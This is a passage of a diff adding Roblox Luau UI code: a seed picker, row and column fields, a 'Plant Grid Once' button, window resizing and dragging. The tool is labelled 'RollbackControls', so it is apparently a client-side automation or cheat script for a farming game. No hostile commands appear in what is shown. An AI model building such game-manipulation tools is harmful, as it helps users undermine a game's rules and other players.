+        create("UICorner",{CornerRadius=UDim.new(0,4), Parent = b})
+        b.MouseButton1Click:Connect(function()
+            seedBox.Text = s
+            selectedSeed = s
+            pcall(function() popup:Destroy() end)
+        end)
+    end
+    task.defer(function() pcall(function() scr.CanvasSize = UDim2.new(0,0,0, lst.AbsoluteContentSize.Y + 8) end) end)
+    local conn; conn = track(UserInputService.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+            local m = inp.Position; local abs = popup.AbsolutePosition; local sz = popup.AbsoluteSize
+            if not (m.X >= abs.X and m.X <= abs.X+sz.X and m.Y >= abs.Y and m.Y <= abs.Y+sz.Y) then
+                pcall(function() popup:Destroy() end)
+                if conn and conn.Connected then conn:Disconnect() end
+            end
+        end
+    end))
+end))
+seedBox.Focused:Connect(function() seedBox:ReleaseFocus() end)
+
+-- rows/cols
+local rc = create("Frame", {Parent = content, Size = UDim2.new(1,0,0,22)}); rc.LayoutOrder = 4
+create("TextLabel", {Parent = rc, Position = UDim2.new(0,0,0,0), Size = UDim2.new(0.32,0,1,0), BackgroundTransparency=1, Text="Rows:", Font=Enum.Font.Gotham, TextSize=12, TextColor3=Color3.fromRGB(210,210,210)})
+local rowsBox = create("TextBox", {Parent = rc, Position = UDim2.new(0.34,0,0,0), Size = UDim2.new(0.12,0,1,0), Text="6", BackgroundColor3=Color3.fromRGB(30,30,34), Font=Enum.Font.Gotham, TextSize=12}); create("UICorner",{CornerRadius=UDim.new(0,6), Parent = rowsBox})
+create("TextLabel", {Parent = rc, Position = UDim2.new(0.50,0,0,0), Size = UDim2.new(0.18,0,1,0), BackgroundTransparency=1, Text="Cols:", Font=Enum.Font.Gotham, TextSize=12, TextColor3=Color3.fromRGB(210,210,210)})
+local colsBox = create("TextBox", {Parent = rc, Position = UDim2.new(0.70,0,0,0), Size = UDim2.new(0.12,0,1,0), Text="6", BackgroundColor3=Color3.fromRGB(30,30,34), Font=Enum.Font.Gotham, TextSize=12}); create("UICorner",{CornerRadius=UDim.new(0,6), Parent = colsBox})
+
+-- Plant Grid Once
+local plantBtn = create("TextButton", {Parent = content, Size = UDim2.new(1,0,0,26)}); plantBtn.LayoutOrder = 5
+plantBtn.Text = "Plant Grid Once"; plantBtn.Font = Enum.Font.GothamBold; plantBtn.TextSize = 13; plantBtn.BackgroundColor3 = Color3.fromRGB(80,140,90)
+create("UICorner",{CornerRadius=UDim.new(0,6), Parent = plantBtn})
+track(plantBtn.MouseButton1Click:Connect(function()
+    local seed = seedBox.Text or selectedSeed
+    local rows = tonumber(rowsBox.Text) and math.max(1, math.floor(tonumber(rowsBox.Text))) or 6
+    local cols = tonumber(colsBox.Text) and math.max(1, math.floor(tonumber(colsBox.Text))) or 6
+    task.spawn(function()
+        local ok, err = plantGrid(rows, cols, seed)
+        notify("Plant Grid", ok and ("Planted "..rows.."x"..cols.." "..seed) or ("Failed: "..tostring(err)), ok and 1.6 or 3, ok)
+    end)
+end))
+
+-- resize handle
+local handle = create("Frame", {Parent = frame, Size = UDim2.new(0,10,0,10), Position = UDim2.new(1,-14,1,-14), BackgroundColor3 = Color3.fromRGB(60,60,64)})
+create("UICorner",{CornerRadius=UDim.new(0,4), Parent = handle})
+handle.Active = true
+do
+    local resizing = false; local moveConn, upConn
+    handle.InputBegan:Connect(function(inp)
+        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
+            resizing = true
+            local start = Vector2.new(inp.Position.X, inp.Position.Y)
+            local startSize = Vector2.new(frame.AbsoluteSize.X, frame.AbsoluteSize.Y)
+            moveConn = track(UserInputService.InputChanged:Connect(function(ch)
+                if resizing and ch.UserInputType == Enum.UserInputType.MouseMovement then
+                    local delta = ch.Position - start
+                    local newW = math.clamp(startSize.X + delta.X, MIN_W, 1000)
+                    local newH = math.clamp(startSize.Y + delta.Y, MIN_H, 1000)
+                    frame.Size = UDim2.new(0, newW, 0, newH)
+                end
+            end))
+            upConn = track(UserInputService.InputEnded:Connect(function(e)
+                if e.UserInputType == Enum.UserInputType.MouseButton1 then
+                    resizing = false
+                    if moveConn and moveConn.Connected then moveConn:Disconnect() end
+                    if upConn and upConn.Connected then upConn:Disconnect() end
+                end
+            end))
+        end
+    end)
+end
+
+-- drag by title
+do
+    local dragging=false; local dragInput, dragStart, startPos
+    title.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true; dragInput = input; dragStart = input.Position; startPos = frame.Position
+        end
+    end)
+    title.InputEnded:Connect(function(input) if input == dragInput then dragging=false end end)
+    track(UserInputService.InputChanged:Connect(function(input)
+        if dragging and input == dragInput and input.Position then
+            local delta = input.Position - dragStart
+            local cam = workspace.CurrentCamera; local vs = cam and cam.ViewportSize or Vector2.new(1024,768)
+            local newX = math.clamp(startPos.X.Offset + delta.X, 0, vs.X - frame.AbsoluteSize.X)
+            local newY = math.clamp(startPos.Y.Offset + delta.Y, 0, vs.Y - frame.AbsoluteSize.Y)
+            frame.Position = UDim2.new(0, newX, 0, newY)
+        end
+    end))
+end
+
+-- cleanup on removal
+track(gui.AncestryChanged:Connect(function()
+    if not gui:IsDescendantOf(game) then cleanup() end
+end))
+
+notify("RollbackControls", "Compact UI ready — Rollback & Cancel preserved", 1.4, true)
